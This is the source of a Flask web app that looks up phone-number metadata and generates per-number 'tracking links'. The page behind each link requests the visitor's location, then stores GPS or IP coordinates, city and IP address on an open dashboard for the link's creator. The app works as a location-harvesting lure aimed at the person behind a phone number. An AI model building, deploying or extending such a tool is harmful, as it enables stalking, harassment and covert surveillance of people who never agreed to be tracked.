from flask import Flask, render_template, request, jsonify, redirect, url_for
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
import uuid
import json
from datetime import datetime

app = Flask(__name__)

# Store tracking links and their associated data
tracking_data = {}

@app.route('/')
def index():
    """Main page with both features"""
    return render_template('index.html')

@app.route('/lookup', methods=['POST'])
def lookup_phone():
    """Look up phone number information (country, carrier, region)"""
    data = request.get_json()
    phone_number = data.get('phone_number', '')

    try:
        # Parse the phone number
        parsed_number = phonenumbers.parse(phone_number)

        # Check if the number is valid
        if not phonenumbers.is_valid_number(parsed_number):
            return jsonify({'success': False, 'error': 'Invalid phone number'})

        # Get information about the number
        country = geocoder.description_for_number(parsed_number, 'en')
        carrier_name = carrier.name_for_number(parsed_number, 'en')
        time_zones = timezone.time_zones_for_number(parsed_number)

        # Get country code
        country_code = phonenumbers.region_code_for_number(parsed_number)

        return jsonify({
            'success': True,
            'data': {
                'phone_number': phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
                'country': country if country else 'Unknown',
                'country_code': country_code if country_code else 'Unknown',
                'carrier': carrier_name if carrier_name else 'Unknown',
                'timezones': list(time_zones) if time_zones else ['Unknown'],
                'is_valid': True,
                'number_type': get_number_type(parsed_number)
            }
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

def get_number_type(parsed_number):
    """Get the type of phone number"""
    number_type = phonenumbers.number_type(parsed_number)
    types = {
        0: 'Fixed Line',
        1: 'Mobile',
        2: 'Fixed Line or Mobile',
        3: 'Toll Free',
        4: 'Premium Rate',
        5: 'Shared Cost',
        6: 'VoIP',
        7: 'Personal Number',
        8: 'Pager',
        9: 'UAN',
        10: 'Unknown'
    }
    return types.get(number_type, 'Unknown')

@app.route('/generate-link', methods=['POST'])
def generate_tracking_link():
    """Generate a unique tracking link"""
    data = request.get_json()
    phone_number = data.get('phone_number', '')

    # Generate unique tracking ID
    tracking_id = str(uuid.uuid4())[:8]

    # Store tracking info
    tracking_data[tracking_id] = {
        'phone_number': phone_number,
        'created_at': datetime.now().isoformat(),
        'location': None,
        'accessed': False
    }

    # Generate the tracking URL
    tracking_url = request.host_url + 'track/' + tracking_id

    return jsonify({
        'success': True,
        'tracking_id': tracking_id,
        'tracking_url': tracking_url
    })

@app.route('/track/<tracking_id>')
def track_location(tracking_id):
    """Page that requests location from the user"""
    if tracking_id not in tracking_data:
        return render_template('error.html', message='Invalid or expired tracking link')

    return render_template('track.html', tracking_id=tracking_id)

@app.route('/save-location', methods=['POST'])
def save_location():
    """Save the location data received from tracking page"""
    data = request.get_json()
    tracking_id = data.get('tracking_id')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    location_type = data.get('type', 'gps')

    if tracking_id in tracking_data:
        # Only update if we don't have GPS location yet, or if this is GPS
        current_location = tracking_data[tracking_id].get('location')
        if current_location is None or location_type == 'gps' or current_location.get('type') == 'ip':
            tracking_data[tracking_id]['location'] = {
                'latitude': latitude,
                'longitude': longitude,
                'accuracy': accuracy,
                'type': location_type,
                'city': data.get('city'),
                'region': data.get('region'),
                'country': data.get('country'),
                'ip': data.get('ip'),
                'timestamp': datetime.now().isoformat()
            }
        tracking_data[tracking_id]['accessed'] = True
        return jsonify({'success': True})

    return jsonify({'success': False, 'error': 'Invalid tracking ID'})

@app.route('/get-location/<tracking_id>')
def get_location(tracking_id):
    """Get the saved location for a tracking ID"""
    if tracking_id in tracking_data:
        return jsonify({
            'success': True,
            'data': tracking_data[tracking_id]
        })
    return jsonify({'success': False, 'error': 'Tracking ID not found'})

@app.route('/dashboard')
def dashboard():
    """View all tracking data"""
    return render_template('dashboard.html', tracking_data=tracking_data)

@app.route('/api/all-locations')
def get_all_locations():
    """API endpoint to get all tracking data"""
    return jsonify({'success': True, 'data': tracking_data})

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port)
